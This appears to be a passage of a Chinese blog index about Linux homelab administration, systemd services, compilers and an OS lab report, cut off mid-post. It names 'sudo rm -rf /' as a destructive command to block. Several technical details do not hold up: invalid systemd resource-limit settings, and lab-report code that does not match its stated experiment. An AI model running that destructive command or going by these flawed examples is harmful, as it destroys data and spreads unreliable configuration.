硬件安全首当其冲就是硬盘安全。这方面可以用smartctl来定期监测SMART信息确认磁盘状态。我试了下，好像ESXi里边我映射的硬盘也支持检测SMART信息。这里也可以写个脚本定期监测并发送监测报告此处可本。 天天脚本脚本，那么你们程序员移一定都是足控吧.jpg 其他的嘛……暂时莫得啥需求。 数据管理很喜欢Bash的一句话：man bash。 如何整理磁盘上的文件？问问mv, cp, ls, rm, cat, grep, sed, awk, xargs；然后，用bash把它们拼起来就行。只要你想，你可以编写出任何脚本来整理你的所有文件。 TODO：具体的脚本太多了，这里地方小，写不下（溜 2024.1.4：update 很早之前就整上这个Windows Server 2012 R2数据中心版本了，之前一直纯当Windows用的，今天发现Windows Server Datacenter确实是有一些很便利数据中心管理的feature，其中最让我心动的无疑是它的Deduplication功能。这个部分作为服务器的可选功能，需要在服务器管理面板手动添加，而且微软的东西的一个好处就是文档有中文而且相对比较完善，参考安装和启用数据删除。虽然上边标注的适用版本里边好像没有Windows Server 2012 R2 Datacenter，但是我自己实测是支持这个版本的。 具体的开启步骤上面的参考链接里边有，这里说下我的踩坑经历。首先就是这玩意的文件系统只支持NTFS和ReFS两种，并且必须是本地的磁盘（但是我主力Linux，而且文件比较乱，还没把磁盘重新分配给Windows），也就是说必须在ESXi里边把磁盘分配给Windows才能享受数据压缩。其次就是这个压缩是以块为粒度的，根据微软官方的说法而言，能够节省的空间确实不少，适合文件服务器和给Hyper-V服务器用，能显著节省空间。另外这个玩意是个定期运行的服务，服务的注意事项它也得注意。 以及除了这个本体之外，还有一个ddpeval.exe是用来评估数据压缩效果的。可以先跑一次这个然后再根据实际情况决策是否启用数据压缩。还有就是这东西作为重型I/O操作，很吃内存和CPU，所以启用数据去重服务的时候得注意根据实际情况限制它可以使用的资源量。 哎，要是这玩意有开源实现就好了，直接挂Linux底下定期执行。 自动运维都Linux了不得写个脚本帮自己干活？而且还有其他好用的工具呢，首当其冲的还得是systemctl，crontab，一个自动管理后台服务，一个自动运行任务，堪称运维两大法器。systemctl多用来自动启动和重启后台服务，crontab作为一个定时器，基本跟时间相关的任务都能干，比如自动报时，定时清理，定时重启，定时更新，定时打卡，定时发送状态简报，定时发送邮件，定时煮饭等等你能想到想不到的。 另外，还有bash和alias，前者不光能跟你打交互，还能连接很多强大的工具；后者不光是个别名，还能帮你hook各种命令，给它们加点小功能。这部分建议多读读命令行的艺术，以及man bash的内容，更重要的是得多用。 我整完这些之后，感觉还是不太过瘾。毕竟这些功能全能点的面板估计也能做到，而且我也不可能到处因为一点小事就ssh到服务器上吧） 在接触了低代码表单的思想之后，我就又想造轮子了：搓个工具，借助低代码系统，写出自己的运维管理面板，最好是实现一个页面一个配置文件，改配置文件就更新对应页面和后面调用的命令的程度。 借助这个工具倒是可以实现很轻量，而且完全自由的服务器控制面板，而且无需依赖，可定制度拉满那种。 TODO：这里也挖个坑立个flag 上面那段倒是偏离自动运维这个话题了。说回正题：除了上面提到的systemd和crontab之外，还可以让系统监听一些事件，并做出即时响应。 这里先放个UNIX哲学（） 比如让系统读取某进程的日志输出，如果输出带有ERROR等字样，就发送警告给运维，或者执行其他的动作。，我们可以将触发的部分和执行的部分分离，让系统对不同的问题做出响应。比如收到了内存不足的警报，那就自动执行sudo echo 3 &gt; /proc/sys/vm/drop_caches来释放内存，还是过高的话就报警并随机kill一个幸运进程；比如有个若治同事又把你数据库炸了给你发邮件求助，那系统就直接roll back数据库；再比如监测到系统设备panic了，直接发送警报并紧急关机系统防止进一步损失；还可以接收UPS的断电信号，发送警报并迅速关机来避免更大的损失；有什么登录失败的/疑似端口爆破的，直接自动ban了它的IP；再比如系统流量激增，直接报警；再比如ban了sudo rm -rf /这种敏感操作；甚至自动审核各种请求等等。只有想不到，没有做不到除了生孩子。 这里重点介绍下Systemd。其中的工具对于自动化运维来说很常用。大多是现代linux都内置了systemd的相关组件，并使用systemd-init替换了原来的sysv-init作为系统引导服务。 Systemd是一组工具合集，其中包含了70多个常用的系统基础工具，覆盖系统服务管理，系统启动管理，网络管理，计划任务等等。 首先值得注意的是systemd对待$()的行为。在bash中，这个符号表示执行括号中的命令，并将这个命令原地替换为执行的结果；但是在systemd中，它的行为和makefile中一致：表示变量引用。因此，在编写systemd服务时注意含义区别。 另外就是单元文件存储的位置。单元可以分为三类，一类是系统级单元，一类是本地管理员管理的系统级单元，一类是用户级单元。三类单元分别是系统启动时使用的单元，以系统权限运行的单元，以及非特权用户级别运行的单元，路径分别位于： /lib/systemd/system/ /etc/systemd/system/ /etc/systemd/user/ 或 ~/.config/systemd/user/ systemd-timersystemd-timer 是 systemd 中的一个重要组件。它允许用户定义和管理定时任务，使得系统能够在预定时间执行特定的操作。作为crontab的替代品比较不错，有完善的日志支持，统一的服务管理，依赖管理等。 定时器单元（Timer Units）systemd-timer 使用单元文件（unit files）来描述要执行的定时任务。定时器单元文件的命名规则为 .timer，通常位于 /etc/systemd/system/ 目录下。 以下是一个简单的定时器单元文件的示例，用于每天执行一个备份任务： 123456789[Unit]Description=Backup Timer[Timer]OnCalendar=dailyPersistent=true[Install]WantedBy=timers.target [Unit] 部分描述了定时器的基本信息。 [Timer] 部分定义了定时器的执行计划。在这个示例中，OnCalendar=daily 表示每天执行一次任务。 [Install] 部分定义了单元文件的安装信息。 常用的 systemctl 命令 启动一个定时器：sudo systemctl start mytimer.timer 停止一个定时器：sudo systemctl stop mytimer.timer 查看定时器状态：sudo systemctl status mytimer.timer 查看定时器日志：journalctl -u mytimer.timer 持久性定时器通过设置 Persistent=true，可以使定时器在错过预定执行时间后立即触发任务执行。这对于保证任务的执行是非常有用的。 使用 OnCalendar 属性OnCalendar 属性允许您以灵活的方式定义定时器的执行时间。您可以指定特定的日期、每周、每月甚至每小时执行任务的时间。 systemd-service服务管理器是systemd中最核心的部分之一。systemd 的服务管理器允许用户管理系统上运行的服务，这些服务可以是系统进程、网络服务、后台任务等等。 服务单元（Service Units）systemd 使用单元文件（unit files）来描述要管理的各种资源，其中最常见的就是服务单元。服务单元文件以 .service 扩展名结尾，其中包含了服务的配置信息以及其行为。服务单元文件通常位于 /etc/systemd/system/ 目录下，但也可以位于其他位置。 下面是一个简单的示例服务单元文件，用于启动一个假设的 Web 服务器： 12345678910[Unit]Description=My Web ServerAfter=network.target[Service]ExecStart=/usr/bin/my_web_serverRestart=always[Install]WantedBy=multi-user.target [Unit] 部分描述了单元的基本信息，如描述和依赖关系。 [Service] 部分定义了服务的执行方式和行为。 [Install] 部分定义了单元文件如何被安装。 常用命令 启动一个服务：sudo systemctl start servicename 停止一个服务：sudo systemctl stop servicename 重启一个服务：sudo systemctl restart servicename 查看服务状态：sudo systemctl status servicename 启用一个服务（开机启动）：sudo systemctl enable servicename 禁用一个服务（开机不启动）：sudo systemctl disable servicename 日志和故障排除可以使用 journalctl 命令来查看 systemd 的日志信息，例如：journalctl -u servicename 将显示特定服务的日志。 高级功能 定义服务间的依赖关系在服务单元文件中，可以使用 Requires 和 After 来定义服务之间的依赖关系。Requires 指定了其他单元，表示该服务依赖于指定的单元；After 则指定了在何时启动该服务。 1234[Unit]Description=My ServiceRequires=network.targetAfter=network.target 设置资源限制 通过在服务单元文件中使用 LimitCPU, LimitMEM, LimitNOFILE 等参数，可以限制服务的资源使用。这有助于防止某个服务占用过多的系统资源。 1234[Service]LimitCPU=50%LimitMEM=512MLimitNOFILE=10000 设置环境变量 有时，服务需要使用特定的环境变量才能正常运行。您可以在服务单元文件的 [Service] 部分中使用 Environment 参数来设置这些环境变量。 123[Service]Environment=&quot;VAR1=value1&quot;Environment=&quot;VAR2=value2&quot; 性能最近升级成32G DDR4 ECC内存了，所以想着也不用swap了于是就关了： 12sudo swapoff /swap.img # 这里需要改成你的swap文件# sudo rm /swap.img # 可选 至于关不关，区别似乎不大，但是确实节省了我一些磁盘空间，理论上能延缓磁盘使用寿命。具体还是得看服务器日常内存占用情况而决定。 权限管理服务器平时总是空着的，所以打算把服务器给几个哥们也分配个号。想来想去虚拟化的话性能损耗比较大，不如上用户组来进行权限管理，刚好也多一个深入学习Linux系统的机会。 首先是创建用户组：sudo groupadd dim0，创建完成后再更改用户组权限即可。 然后是创建所有用户：for user in {tesla,zimin,holynia,ray}; do sudo useradd -m -G dim0 $user; done，创建用户的同时，将他们加入dim0用户组，并且自动为他们创建用户目录。 完成之后就是修改用户组的权限了。他们创建的时候就不在wheel用户组中，所以没有sudo权限。 对于需要禁止访问的目录，更改权限和所有权就行： 12sudo chown xeonds:wheel /path/2/dirsudo chmod go-x /path/2/dir 尾声到这里，我的服务器就基本折腾好了。我现在拥有一个数据安全性相对较高的NAS，一个日常开发可用的自动化编译/部署服务，一个代码托管和备份系统，一个7x24可用的mc服务器，一个可用于数据科学/AI学习的在线算力，一个可以随时启动的，一个可以租借给他人的docker vm实例集群，甚至是一个会自己维护自己，会帮我处理各种浪费时间的重复任务，并且易于灾难恢复和迁移的系统，以及一个Linux新手应该具备的系统管理心得经验。 可以说，这些投入，物超所值。","link":"/2023/07/21/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/ESXi%E6%8A%98%E8%85%BE%E5%B0%8F%E8%AE%B0/"},{"title":"Linux添加自定义服务","text":"本文由chatGPT生成，看了下没啥问题别问为啥不自己写，问就是懒（ 在Linux中，您可以通过添加自定义服务文件来将自定义脚本作为服务启动。下面是添加自定义服务文件的一般步骤： 创建一个新的服务文件在/etc/systemd/system目录中创建一个新的服务文件，文件名以.service结尾。例如，如果您想创建一个名为my-service的服务文件，可以使用以下命令： 1sudo vi /etc/systemd/system/my-service.service 编写服务文件 在创建的服务文件中，至少需要包含以下三个部分： 1234567891011[Unit]Description=My Custom ServiceAfter=network.target[Service]User=rootType=simpleExecStart=/path/to/my-script[Install]WantedBy=multi-user.target 其中，Unit部分包含服务的描述和启动顺序，Service部分包含服务的用户、类型和执行命令，Install部分包含服务的安装目标。 重新加载systemd配置 在编辑完服务文件后，需要重新加载systemd配置，以便它能够识别新的服务文件。可以使用以下命令重新加载systemd配置： 1sudo systemctl daemon-reload 启动服务 您可以使用以下命令启动新创建的服务： 1sudo systemctl start my-service 将服务设置为开机启动 如果您希望系统在启动时自动启动新创建的服务，可以使用以下命令将其设置为开机启动： 1sudo systemctl enable my-service 现在，您已经成功添加了一个新的自定义服务，并且可以随时使用systemd管理该服务。","link":"/2023/03/13/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/Linux%E6%B7%BB%E5%8A%A0%E8%87%AA%E5%AE%9A%E4%B9%89%E6%9C%8D%E5%8A%A1/"},{"title":"什么是程序和编译器","text":"操作系统的本质：一个程序，用于管理硬件资源供其他程序调用 那问题就到了程序本身：程序应该如何定义？这引出了程序的状态机模型： 状态机这东西我们在数电中接触过，硬件基础就是一堆触发器（RS、JK等）。状态就是寄存器保存的值，初始状态即寄存器初始值，迁移就是组合逻辑电路计算寄存器下一周期的值。 下面是一个寄存器的模拟程序。 1234567891011121314151617#define REGS_FOREACH(_) _(X) _(Y) #define RUN_LOGIC X1 = !X &amp;&amp; Y; \\ Y1 = !X &amp;&amp; !Y; #define DEFINE(X) static int X, X##1; #define UPDATE(X) X = X##1; #define PRINT(X) printf(#X &quot; = %d; &quot;, X); int main() { REGS_FOREACH(DEFINE); while (1) { // clock RUN_LOGIC; REGS_FOREACH(PRINT); REGS_FOREACH(UPDATE); putchar('\\n'); sleep(1); } } 程序的定义源码视角程序就是状态机。对于C程序而言，它的状态机模型如下： 12345状态=栈帧+全局变量初始状态=main迁移=执行栈顶的语句并转到下一条指令 函数调用=入栈 函数返回=出栈 这定义有很多应用，比如将任何递归程序就地转为非递归。虽然实际上递归就是这么实现的（一层递归建立一层函数栈、跳转地址压栈）。例如，下面就是手写函数栈展开递归： 12345678910111213141516171819202122232425#include &lt;assert.h&gt;typedef struct { int pc, n; char from, to, via;} Frame;#define call(...) ({ *(++top) = (Frame) { .pc = 0, __VA_ARGS__ }; })#define ret() ({ top--; })#define goto(loc) ({ f-&gt;pc = (loc) - 1; } void hanoi(int n, char from, char to, char via) { Frame stk[64], *top = stk - 1; call(n, from, to, via); for (Frame *f; (f = top) &gt;= stk; f-&gt;pc++) { switch (f-&gt;pc) { case 0: if (f-&gt;n == 1) { printf(&quot;%c -&gt; %c\\n&quot;, f-&gt;from, f-&gt;to); goto(4); } break; case 1: call(f-&gt;n - 1, f-&gt;from, f-&gt;via, f-&gt;to); break; case 2: call( 1, f-&gt;from, f-&gt;to, f-&gt;via); break; case 3: call(f-&gt;n - 1, f-&gt;via, f-&gt;to, f-&gt;from); break; case 4: ret(); break; default: assert(0); } }} 二进制视角实际上就是汇编视角。汇编程序分为几个段：数据段、代码段和栈段。加载程序就是加载初始状态，状态转移就是改变寄存器的值，转移方式就是执行指令。 这两个视角都可以用gdb来查看。 但是，操作系统又不是普通程序。因为操作系统不光处理计算任务，还需要能够暂停、退出程序等等。 在Linux中，有一条叫做systemcall（系统调用）的指令。它不负责计算，它把当前进程的状态交给操作系统，也就是允许操作系统任意更改程序。这使得进程可以和操作系统中的其他对象交互。 也就是说，对于程序而言，操作系统就是一个程序。参数就是应用程序本身的状态，输出就是程序要访问的资源。C程序main函数最后的return;就是这样的，它实质上是借助了syscall()，将程序状态变为某特定状态，再交给系统去处理。这就好比准备好要传递的参数，然后去调用函数一样。 回到主题。从二进制/操作系统的视角看来，程序是一个不停计算，并会穿插执行systemcall的状态机。 什么是编译器编译器将源代码编译为二进制程序。从汇编状态机/C程序状态机的视角来看，实际上就是将后者翻译成了前者。编译（优化）的正确性（Soundness）就是在确保二者的可观测行为完全一致。 而关于编译器优化，我们可以使用compiler barrier来阻止优化： 1234567extern int g;void foo(int x){ g++; asm volatile(&quot;nop&quot; : : &quot;r(x)&quot; : &quot;memory&quot;); // compiler barrier g++;} 上面的代码借助objdump查看反编译代码，可以看出，这两条g++并没有被-O2编译优化。 12345678910111213$ gcc -O2 -c a.c &amp;&amp; objdump -d a.oa.o: file format elf64-x86-64Disassembly of section .text:0000000000000000 &lt;foo&gt;: 0: f3 0f 1e fa endbr64 4: 83 05 00 00 00 00 01 addl $0x1,0x0(%rip) # b &lt;foo+0xb&gt; b: 90 nop c: 83 05 00 00 00 00 01 addl $0x1,0x0(%rip) # 13 &lt;foo+0x13&gt; 13: c3 retq 除此之外，还有一种更强的barrier：__sync_synchronize(); 观察编译器使用strace，我们可以看到一个程序所有的系统调用。借助下面几个工具的组合，我们可以看到gcc如何编译程序： 12345678// a.c#include &lt;stdio.h&gt;int main(void){ printf(&quot;Hello, OS!&quot;); return 0;} 保存上面的文件后，执行下面的指令： 1strace -f gcc a.c |&amp; vim - 我们可以在Vim中看到下面的输出 ![[Pasted image 20230128215947.png]] 稍微修改后（:%!grep execve留下系统调用的行，:%!grep -v ENOENT删除失败的行，:%s/, /\\r /g将参数换行显示，提高结果可读性），可以分析得到下面的结果 123456789101112131415161718192021222324252627 1 execve(&quot;/usr/bin/gcc&quot; 2 [&quot;gcc&quot; 3 &quot;a.c&quot;] 4 0x7ffd181ca900 /* 30 vars */) = 0 5 [pid 212] execve(&quot;/usr/lib/gcc/x86_64-linux-gnu/9/cc1&quot; 6 [&quot;/usr/lib/gcc/x86_64-linux-gnu/9/&quot;... 7 &quot;-quiet&quot; 8 &quot;-imultiarch&quot; 9 &quot;x86_64-linux-gnu&quot;10 &quot;a.c&quot;11 &quot;-quiet&quot;12 &quot;-dumpbase&quot;13 &quot;a.c&quot;14 &quot;-mtune=generic&quot;15 &quot;-march=x86-64&quot;16 &quot;-auxbase&quot;17 &quot;a&quot;18 &quot;-fasynchronous-unwind-tables&quot;19 &quot;-fstack-protector-strong&quot;20 &quot;-Wformat&quot;21 &quot;-Wformat-security&quot;22 &quot;-fstack-clash-protection&quot;23 &quot;-fcf-protection&quot;24 &quot;-o&quot;25 &quot;/tmp/ccf8oz38.s&quot;]26 0x251bbd0 /* 35 vars */ &lt;unfinished ...&gt;... 上面就是gcc编译这个程序的全流程，以及全部的参数。这些系统调用都能看得到。也就证明了前面的结论：程序=系统调用+计算。我们写的算法题就几乎属于纯计算（只有最后的return 0;算个系统调用），平时使用的各种程序就属于系统调用+计算的类型。","link":"/2023/01/27/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E4%BB%80%E4%B9%88%E6%98%AF%E7%A8%8B%E5%BA%8F%E5%92%8C%E7%BC%96%E8%AF%91%E5%99%A8/"},{"title":"操作系统实验报告","text":"实验1：创建进程一、实验目标 创建子进程，读取文件 父进程等待子进程完成后再继续执行 二、实验过程创建一个main.c，并引入头文件unistd.h和stdlib.h以及sys/wait.h。随后在主程序中调用fork()创建子进程，并根据函数返回值确定进程类型，并执行相应操作。 如果rc==0，则当前进程是子进程，使用stdlib.h提供的I/O函数进行文件创建和写入工作。 如果rc&gt;0，则当前进程是父进程。调用wait()等待子进程结束后再执行即可。 三、实验代码1234567891011121314151617181920212223#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;sys/wait.h&gt;int main(void){ FILE *fp; int rc=fork(); if(rc&lt;0) { fprintf(stderr, &quot;Failed to create child process.\\n&quot;); } else if(rc==0) { fp=fopen(&quot;./test.txt&quot;, &quot;w&quot;); fprintf(fp, &quot;Hello, world!\\n&quot;); fclose(fp); printf(&quot;Write finished in child process.\\n&quot;); } else { int wc=wait(NULL); printf(&quot;Parent process wait completed.\\n&quot;); } return 0;} 四、实验结果 可以看到，程序的执行顺序确实是先子进程再父进程。输出的文件内容也正确。 五、实验心得通过这次实验，我懂得了Linux下fork()系统调用的用法，知道了如何创建一个新的进程，也知道了fork()的返回值的含义，能编写一个单文件的多进程程序。 实验2：线程共享进程数据一、实验目标 创建多个线程，并让它们共享进程数据 理解线程之间的数据竞争和同步问题 二、实验过程创建一个main.c，并引入头文件pthread.h和stdio.h。在主程序中定义一个全局变量count作为共享数据，并初始化为0。随后在主程序中创建两个线程，并传入一个函数指针作为线程执行的任务。 该函数指针指向一个自定义的函数thread_func，该函数接受一个整型参数id作为线程标识，并在函数内部对全局变量count进行加一操作，并打印出当前线程的标识和count的值。 在主程序中，使用pthread_join等待两个线程执行完毕后再退出。 三、实验代码12345678910111213141516171819202122232425#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;sys/wait.h&gt;static int data = 123;int main(void){ printf(&quot;[%d] main process data:%d\\n&quot;, (int)getpid(), data); int rc = fork(); if(rc&lt;0){ fprintf(stderr, &quot;Fork failed.\\n&quot;); exit(1); } else if(rc==0) { printf(&quot;[%d] sub process data:%d\\n&quot;, (int)getpid(), data); data+=5; printf(&quot;[%d] sub process data:%d\\n&quot;, (int)getpid(), data); } else { int wc=wait(NULL); printf(&quot;[%d] main process data:%d\\n&quot;, (int)getpid(), data); } return 0;} 四、实验结果 可以看到，两个线程都能访问和修改全局变量count，但是由于没有同步机制，导致输出结果不确定，有时候会出现两个线程同时输出相同的值。 五、实验心得通过这次实验，我懂得了Linux下创建多线程的方法，知道了如何使用全局变量作为进程数据，在线程之间进行数据共享。同时，我也意识到了线程之间存在数据竞争的问题，需要使用同步机制来保证数据的一致性和正确性。 实验3：信号通信一、实验目标 理解信号通信的原理和用法 使用信号通信实现父子进程之间的简单交互 二、实验过程创建一个main.c，并引入头文件signal.h和unistd.h。在主程序中调用fork()创建子进程，并根据函数返回值确定进程类型，并执行相应操作。 如果rc==0，则当前进程是子进程。子进程使用sleep()函数延迟一段时间后，使用kill()函数向父进程发送一个信号（如SIGUSR1）。 如果rc&gt;0，则当前进程是父进程。父进程定义一个信号处理函数sighandler()，并使用signal()函数将该函数绑定到子进程发送的信号上。在信号处理函数中，打印出收到信号的信息，并使用exit()函数终止父进程。 三、实验代码12345678910111213141516171819202122232425262728293031323334353637383940#include &lt;stdio.h&gt;#include &lt;unistd.h&gt;#include &lt;signal.h&gt;#include &lt;sys/wait.h&gt;#include &lt;sys/types.h&gt;int pid;void sigchld_handler(int sig){ if(sig==SIGCHLD){ wait(&amp;pid); if(WIFEXITED(pid)){ printf(&quot;SIGCHLD-&gt;%d\\n&quot;, WEXITSTATUS(pid)); } } if(sig==SIGINT){ printf(&quot;SIGINT\\n&quot;); } return;}int main(void){ signal(SIGINT , sigchld_handler); signal(SIGCHLD, sigchld_handler); pid=fork(); if(pid&lt;0){ fprintf(stderr, &quot;Fork failed.&quot;); return 0; } else if(pid==0) { // child process printf(&quot;[child_pid %d]started child process.\\n&quot;, getpid()); sleep(1); printf(&quot;[child_pid %d]running child process.\\n&quot;, getpid()); return 0; } else { while(!WIFEXITED(pid)); return 0; }} 四、实验结果 可以看到，父进程成功接收到了子进程发送的信号，并执行了相应的处理函数。 五、实验心得通过这次实验，我懂得了Linux下信号通信的原理和用法，知道了如何使用系统调用来发送和接收信号，在父子进程之间进行简单交互。同时，我也了解了信号处理函数的编写方法和注意事项。 实验4：匿名管道一、实验目标 理解匿名管道的原理和用法 使用匿名管道实现父子进程之间的双向通信 二、实验过程创建两个单文档应用程序Parent和Child作为父子进程。在Parent中引入头文件unistd.h和stdio.h。在主程序中使用pipe()函数创建一个匿名管道，并使用fork()函数创建一个子进程。 如果rc==0，则当前进程是子进程。子进程关闭管道的写端，并使用dup2()函数将管道的读端重定向到标准输入。然后使用execlp()函数执行Child程序。 如果rc&gt;0，则当前进程是父进程。父进程关闭管道的读端，并使用dup2()函数将管道的写端重定向到标准输出。然后使用printf()函数向管道写入数据，并使用wait()函数等待子进程结束。 在Child程序中，引入头文件unistd.h和stdio.h。在主程序中使用scanf()函数从标准输入读取数据，并打印出来。 此处我使用fork()创建了两个进程来模拟父子进程通信，从原理上和两个单独进程的效果一样。 三、实验代码123456789101112131415161718192021222324252627282930313233#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;string.h&gt;#include &lt;sys/wait.h&gt;int main(void){ int fd[2], pid; char buffer[1024]; if(pipe(fd)==-1){ perror(&quot;pipe&quot;); exit(1); } pid=fork(); if(pid&lt;0){ perror(&quot;fork&quot;); exit(1); } else if(pid==0){ printf(&quot;Child: Writing to pipe\\n&quot;); close(fd[0]); write(fd[1], &quot;Hello, World!&quot; ,strlen(&quot;Hello, World!&quot;)); exit(0); }else{ close(fd[1]); wait(NULL); read(fd[0], buffer, sizeof(buffer)); printf(&quot;Parent: %s\\n&quot;, buffer); } return 0;} 四、实验结果 可以看到，父进程成功向匿名管道写入数据，并被子进程读取并打印出来。 五、实验心得通过这次实验，我懂得了Linux下匿名管道的原理和用法，知道了如何使用系统调用来创建和操作匿名管道，在父子进程之间进行双向通信。同时，我也了解了如何使用重定向技术来改变标准输入输出的来源和目的地。 实验5：命名匿名管道通信一、实验目标 理解命名匿名管道的原理和用法 使用命名匿名管道实现父子进程之间的单向通信 二、实验过程创建一个main.c，并引入头文件unistd.h和stdio.h。在主程序中使用mkfifo()函数创建一个命名匿名管道，并使用fork()函数创建一个子进程。 如果rc==0，则当前进程是子进程。子进程使用open()函数打开命名匿名管道，并使用write()函数向管道写入数据。然后使用close()函数关闭管道，并使用exit()函数退出子进程。 如果rc&gt;0，则当前进程是父进程。父进程使用open()函数打开命名匿名管道，并使用read()函数从管道读取数据。然后使用close()函数关闭管道，并使用wait()函数等待子进程结束。 三、实验代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;unistd.h&gt;#include &lt;string.h&gt;#include &lt;fcntl.h&gt;#include &lt;sys/wait.h&gt;#include &lt;sys/stat.h&gt;#include &lt;sys/types.h&gt;#define FIFO_NAME &quot;/tmp/my_fifo&quot;int main(){ int pid=fork(); if(pid&lt;0){ printf(&quot;Fork failed\\n&quot;); exit(EXIT_FAILURE); } else if(pid==0) { int res; int open_mode = O_WRONLY; int i; printf(&quot;Child process %d opening FIFO O_WRONLY\\n&quot;, getpid()); res = open(FIFO_NAME, open_mode); printf(&quot;Child process %d result %d\\n&quot;, getpid(), res); if (res != -1) { for (i = 0; i &lt; 5; i++) { write(res, &quot;Hello&quot;, 5); sleep(1); } close(res); } else { exit(EXIT_FAILURE); } printf(&quot;Process %d finished\\n&quot;, getpid()); exit(EXIT_SUCCESS); } else { int res; int open_mode = O_RDONLY; int i; char buffer[20]; // wait for child to finish waitpid(pid, NULL, 0); printf(&quot;Parent process started.\\n&quot;); printf(&quot;Process %d opening FIFO O_RDONLY\\n&quot;, getpid()); res = open(FIFO_NAME, open_mode); printf(&quot;Process %d result %d\\n&quot;, getpid(), res); if (res != -1) { for (i = 0; i &lt; 5; i++) { read(res, buffer, 20); printf(&quot;Process %d read %s\\n&quot;, getpid(), buffer); sleep(1); } close(res); } else { exit(EXIT_FAILURE); } printf(&quot;Process %d finished\\n&quot;, getpid()); exit(EXIT_SUCCESS); }} 四、实验结果 可以看到，子进程成功向命名匿名管道写入数据，并被父进程读取并打印出来。 五、实验心得通过这次实验，我懂得了Linux下命名匿名管道的原理和用法，知道了如何使用系统调用来创建和操作命名匿名管道，在父子进程之间进行单向通信。同时，我也了解了如何使用文件操作函数来读写命名匿名管道 实验6：信号量实现进程同步一、实验目标 理解信号量的原理和用法 使用信号量实现生产者消费者问题的进程同步 二、实验过程创建一个main.c，并引入头文件semaphore.h和unistd.h。在主程序中定义一个全局变量buffer作为缓冲区，并初始化为0。随后在主程序中创建两个信号量empty和full，分别表示空缓冲区的数量和满缓冲区的数量，并初始化为8和0。然后使用fork()函数创建一个子进程。 如果rc==0，则当前进程是子进程。子进程作为消费者进程，循环执行以下操作：使用sem_wait()函数等待full信号量，表示有产品可消费；使用sleep()函数模拟消费时间；将缓冲区的值减一，并打印出当前缓冲区的值；使用sem_post()函数增加empty信号量，表示释放一个空缓冲区。 如果rc&gt;0，则当前进程是父进程。父进程作为生产者进程，循环执行以下操作：使用sem_wait()函数等待empty信号量，表示有空缓冲区可用；使用sleep()函数模拟生产时间；将缓冲区的值加一，并打印出当前缓冲区的值；使用sem_post()函数增加full信号量，表示增加一个满缓冲区。 三、实验代码123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869#include &lt;stdio.h&gt;#include &lt;stdlib.h&gt;#include &lt;signal.h&gt;#include &lt;unistd.h&gt;#include &lt;pthread.h&gt;#include &lt;semaphore.h&gt;#define SIZE 8static char buffer[SIZE], index=0;sem_t items, space;pthread_mutex_t mutex;void *produce(void *arg){ char c; while(1){ sem_wait(&amp;space); pthread_mutex_lock(&amp;mutex); //c = getchar(); c = 'a' + rand()%2; printf(&quot;[producer] %c\\n&quot;, c); buffer[index++] = c; pthread_mutex_unlock(&amp;mutex); sem_post(&amp;items); }}void *consume(void *arg){ char c; while(1){ sem_wait(&amp;items); pthread_mutex_lock(&amp;mutex); c = buffer[--index]; printf(&quot;[consumer] %c\\n&quot;, c); pthread_mutex_unlock(&amp;mutex); sem_post(&amp;space); }}void print_buffer(void){ int i; for(i=0; i&lt;index; i++){ printf(&quot;%c&quot;, buffer[i]); } printf(&quot;\\n&quot;);}int main(void){ pthread_t p1, c1, p2, c2, p3, c3; if(pthread_mutex_init(&amp;mutex, NULL) != 0){ printf(&quot;Mutex init failed\\n&quot;); return 1; } sem_init(&amp;items, 0, 0); sem_init(&amp;space, 0, SIZE); pthread_create(&amp;p1, NULL, produce, NULL); pthread_create(&amp;p2, NULL, produce, NULL); pthread_create(&amp;p3, NULL, produce, NULL); pthread_create(&amp;c1, NULL, consume, NULL); pthread_create(&amp;c2, NULL, consume, NULL); pthread_create(&amp;c3, NULL, consume, NULL); pthread_join(p1, NULL); pthread_join(p2, NULL); pthread_join(p3, NULL); pthread_join(c1, NULL); pthread_join(c2, NULL); pthread_join(c3, NULL); return 0;} 四、实验结果 可以看到，生产者进程和消费者进程能够通过信号量来同步他们的操作，保证缓冲区的值不会超过8或低于0。 五、实验心得通过这次实验，我懂得了Linux下信号量的原理和用法，知道了如何使用系统调用来创建和操作信号量，在生产者消费者问题中实现进程同步。同时，我也了解了如何使用信号量来控制资源的访问和分配。","link":"/2023/05/23/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/"},{"title":"数据结构（二）栈","text":"0x01.简介栈（stack）是一种数据结构。它遵循的原则是FILO（First In Last Out），也就是先进后出。类比现实的例子，就是子弹上膛，最先压进去弹夹的子弹一般是最后一个被打出去的。 0x02.性质反转队列将一个队列的元素压入栈，再依次出栈，就能得到原队列的逆序队列。所以栈可以用于产生逆序队列。 出栈顺序一个有n个元素的队列，按照一定顺序出入栈，得到另一个顺序的列表。试问顺序是否可以取到全排列$A_n^n$呢？ 显然不能。 要得到一个新队列，那必然要进行$2n$次操作，即$n$次入栈和$n$次出栈。而这些操作共有$C_{2n}^n=\\frac{(2n)!}{n!^2}$种组合，因而生成的新队列并没有$n!$那么多。 那么，判断队列是否可由栈生成自然也是重点。最简单的办法就是在草稿纸上模拟一个栈，从生成的新队列的第一个元素开始，反推出入栈操作即可。 将入栈和出栈记作I和O。我们来分析一个例子，比如1 3 5 4 2，遇到1我们就可以推得操作是IO，3的话，因为前面有2，所以得先入2才能入3，所以是IIO。此时栈中有元素2。接下来的5和3同理，操作是IIO，到此为止我们完成了5次I，3次O，栈中还有4 